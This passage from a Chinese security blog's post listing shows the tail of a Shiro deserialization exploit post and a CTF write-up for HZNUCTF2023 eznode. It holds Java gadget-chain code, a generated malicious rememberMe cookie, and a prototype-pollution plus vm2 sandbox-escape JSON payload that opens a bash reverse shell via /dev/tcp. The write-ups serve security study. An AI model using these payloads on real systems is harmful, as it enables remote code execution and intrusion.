class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, tfi);</span><br><span class="line">		<span class="comment">/*************************</span></span><br><span class="line"><span class="comment">		这里使用new AttrCompare()的原因：</span></span><br><span class="line"><span class="comment">		BeanComparator构造方法如果不指定comparator会使用CC里面的ComparableComparator  有可能找不到报错</span></span><br><span class="line"><span class="comment">		AttrCompare也是一种Comparator  并且public, serializable</span></span><br><span class="line"><span class="comment">		************************/</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">bc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line">		</span><br><span class="line">    	<span class="comment">/***********************</span></span><br><span class="line"><span class="comment">    	 这里先不放BeanComparator  因为add过程中会调用 可能会报错</span></span><br><span class="line"><span class="comment">    	 同理add时先不add templates  </span></span><br><span class="line"><span class="comment">    	 最后序列化之前设置好各个成员变量为目标变量 （反序列化时操作的是目标变量即可）</span></span><br><span class="line"><span class="comment">    	 ***************************/</span></span><br><span class="line">        PriorityQueue&lt;Object&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">        <span class="type">Field</span> <span class="variable">cprtField</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        cprtField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cprtField.set(pq, bc);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">queueArray</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queueArray.set(pq, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"><span class="comment">//        serialize(pq);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;bin&quot;);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h3><p>由序列化后的文件生成cookie  并发送触发反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">generate</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(filename));</span><br><span class="line"></span><br><span class="line">        <span class="type">AbstractRememberMeManager</span> <span class="variable">arm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CookieRememberMeManager</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> AbstractRememberMeManager.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">encryptMethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;encrypt&quot;</span>, <span class="type">byte</span>[].class);</span><br><span class="line">        encryptMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] encrypted = (<span class="type">byte</span>[]) encryptMethod.invoke(arm, bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cookie</span> <span class="operator">=</span> Base64.encodeToString(encrypted);</span><br><span class="line">        System.out.println(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 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</span></span><br></pre></td></tr></table></figure>

<p>Cookie中最好删除JSESSID再发送</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png?raw=true" alt="img"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?share_source=copy_web&vd_source=515182f812086f458c10553996fb6c65">Shiro反序列化漏洞(三)-shiro无依赖利用链</a></p>
<p><a target="_blank" rel="noopener" href="https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记一（原理篇）</a></p>
</blockquote>

	
	</div>
  <a type="button" href="/2023/12/13/Shiro反序列化/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/11/30/HZNUCTF2023-eznode-wp/" >HZNUCTF2023-eznode-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-11-30
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p>访问<code>/app.js</code>得到源码    </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>merge函数明显是要利用原型链污染   </p>
<p>body中需要设置<code>shit</code>值来执行<code>42# backdoor()</code>   同时原型链中要构造好shellcode来执行</p>
<p>但是shellcode是在vm2沙盒中执行的  关于沙盒逃逸可以看 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a></p>
<p>最后payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;shit&quot;</span><span class="punctuation">:</span><span class="string">&quot;true&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;shellcode&quot;</span><span class="punctuation">:</span><span class="string">&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(\&quot;return this\&quot;) ().process.mainModule.require(\&quot;child_process\&quot;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;).toString();&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/11/30/HZNUCTF2023-eznode-wp/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
        

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/CVE/">CVE<span>11</span></a></li>
		
			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
		
			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
		
			<li><a href="/categories/pwn-wp/">pwn-wp<span>22</span></a></li>
		
			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
		
			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
		
			<li><a href="/categories/web-learning/">web-learning<span>8</span></a></li>
		
			<li><a href="/categories/web-wp/">web-wp<span>54</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/javascript/">javascript<span>1</span></a></li>
		
			<li><a href="/tags/二次编码绕过/">二次编码绕过<span>1</span></a></li>
		
			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
		
			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
		
			<li><a href="/tags/Hacklu2015/">Hacklu2015<span>1</span></a></li>
		
			<li><a href="/tags/GKCTF2021/">GKCTF2021<span>1</span></a></li>
		
			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
		
			<li><a href="/tags/md5/">md5<span>1</span></a></li>
		
			<li><a href="/tags/partial-overwrite/">partial overwrite<span>1</span></a></li>
		
			<li><a href="/tags/AFL/">AFL<span>2</span></a></li>
		
			<li><a href="/tags/stack/">stack<span>10</span></a></li>
		
			<li><a href="/tags/HCTF2018/">HCTF2018<span>1</span></a></li>
		
			<li><a href="/tags/sigsegv/">sigsegv<span>1</span></a></li>
		
			<li><a href="/tags/libc/">libc<span>1</span></a></li>
		
			<li><a href="/tags/thread/">thread<span>1</span></a></li>
		
			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
		
			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
		
			<li><a href="/tags/De1ctf2019/">De1ctf2019<span>1</span></a></li>
		
			<li><a href="/tags/sha1/">sha1<span>1</span></a></li>
		
			<li><a href="/tags/二进制插桩/">二进制插桩<span>2</span></a></li>
		
		
		   <li><a href="/tags">...<span>126</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2024/01/19/Spring4Shell漏洞/" ><i class="fa fa-file-o"></i>Spring4Shell漏洞(CVE-2022-229...</a>
      </li>
    
      <li>
        <a href="/2024/01/16/JNDI注入/" ><i class="fa fa-file-o"></i>JNDI注入</a>
      </li>
    
      <li>
        <a href="/2024/01/11/HTB-bizness-wp/" ><i class="fa fa-file-o"></i>HTB-bizness-wp</a>
      </li>
    
      <li>
        <a href="/2024/01/10/node反序列化RCE/" ><i class="fa fa-file-o"></i>node反序列化RCE(CVE-2017-5941)</a>
      </li>
    
      <li>
        <a href="/2024/01/04/HNCTF2023-BabyJxVx-wp/" ><i class="fa fa-file-o"></i>HNCTF2023-BabyJxVx-wp</a>
      </li>
    
  </ul>
</div>

		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer>  </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
